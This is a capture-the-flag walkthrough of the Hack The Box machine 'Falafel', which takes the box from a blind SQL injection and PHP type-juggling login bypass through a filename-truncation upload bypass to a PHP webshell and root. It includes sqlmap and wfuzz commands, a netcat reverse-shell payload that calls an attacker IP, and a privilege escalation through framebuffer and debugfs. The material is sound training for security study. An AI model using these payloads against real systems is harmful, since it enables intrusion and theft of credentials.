## Falafel

https://app.hackthebox.com/machines/Falafel

### www-data

Open 10.10.10.73:22
Open 10.10.10.73:80

/robots.txt has a entry with \*.txt. We can include this extension on our directory enumeration.

**GoBuster**
/assets               (Status: 301)
/connection.php       (Status: 200)
/index.php            (Status: 200)
/login.php            (Status: 200)
/profile.php          (Status: 302)
/robots.txt           (Status: 200)
/upload.php           (Status: 302)
/uploads              (Status: 301)
/cyberlaw.txt        (Status: 200)

**cyberlaw.txt**
```
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
Date: November 25, 2017 3:30:58 PM PDT
To: lawyers@falafel.htb, devs@falafel.htb
Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
Mime-Version: 1.0
X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
X-Spam-Level: ***

A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
so I have no idea how he did it.

Dear lawyers, please handle him. I believe Cyberlaw is on our side.
Dear develpors, fix this broken site ASAP.

~admin
```

#### SQL Injection
If user exists: Wrong identification : admin  
If it doesn't: Try again..  
If omit password parameter like this `username=admin'--+-%26password%3dadmin`, we get: Invalid username/password.  

We can enumerate users with wfuzz.
```
wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http://10.10.10.73/login.php --hh 7074

000086:  C=200    102 L      659 W         7091 Ch        "admin"
001883:  C=200    102 L      659 W         7091 Ch        "chris"
```

<br>

#### SQL Payload
```
username=admin' OR 1=1--+-&password=admin
username=admin' OR 1=2--+-&password=admin
```

We can use sqlmap to dump the database, but we need to give the response equivalent to "true", in this case: Wrong identification...
```
sqlmap -r login.request --level 5 --risk 3 --batch --string "Wrong identification" --dump
```

Testing manually
```
admin' and substr(password,1,1) = '0'-- -
```

Automated exploit on injection.py.

Extracted hash: d4ee02a22fc872e36d9e3751ba72ddc8. Login with chris:juggling

<br>

#### Type Juggling
By the hints, we can test PHP Type Juggling in login. Since we known the admin's hash starts with 0e, we can find a [hash collision](https://news.ycombinator.com/item?id=9484757).

```
echo -n 240610708 | md5sum
0e462097431906509019562988736854  -
```

Login with admin:240610708.

<br>

#### File Upload
In the upload file function, we see that wget is being used.

![Pasted image 20240527113521](https://github.com/b1d0ws/OSWE/assets/58514930/635fffc9-480e-41d5-8ce0-d4143c3056dd)

If we try a .php file, it returns "Bad extension".

If we upload a very long name file, we get "The name is too long, 501 chars total."

Searching for "max character length linux file", we discover that linux has a maximum filename length of 255 characters, so we can try something close to this on uploading a file that cuts the .gif extension.

```
# Get the print and add '.gif'

# Too long
python -c 'print("A" * 240)'

# Successful
python -c 'print("A" * 230)'

# Add different letters to see where it cuts the filename
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFG.

# Upload the file as with webshell:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABC.php.gif

# Get shell on /uploads/0527-1801_c5afa75590294983/FILENAME.php

# Body post request to reverse shell
cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+10.10.14.4+1337+>/tmp/f
```

### www-data to moshe
moshe's password is the same as database and we can find it on `/var/www/html/connection.php`:falafelIsReallyTasty.

<br>

### moshe to yossi
We notice that yossi is logged on the host with 'w' command.
```
w
yossi    tty1   07:02   9:16m  0.16s  0.10s -bash
```

Looking at groups, moshe belongs to 'audio' and 'video'.

This means we can cat the yossi's frame buffer.
```
cat /dev/fb0 > screenshot.raw
```

To correctly see the image, we need to get its resolution on `/sys/class/graphics/fb0`
```
cat /sys/class/graphics/fb0/virtual_size
1176,885
```

You can get the file through nc and open it on your kali with gimp.

![1526605221968](https://github.com/b1d0ws/OSWE/assets/58514930/37eced09-7934-4eb7-8726-23da86ed6d4e)

The password **MoshePlzStopHackingMe!** works for yossi.

<br>

### yossi to root
Since yossi belongs to "disk" group, we can debug the file system.
```
debugfs /dev/sda1
debugfs:  ls /root
debugfs:  cat /root/root.txt
```

We could also get root SSH key inside .ssh.

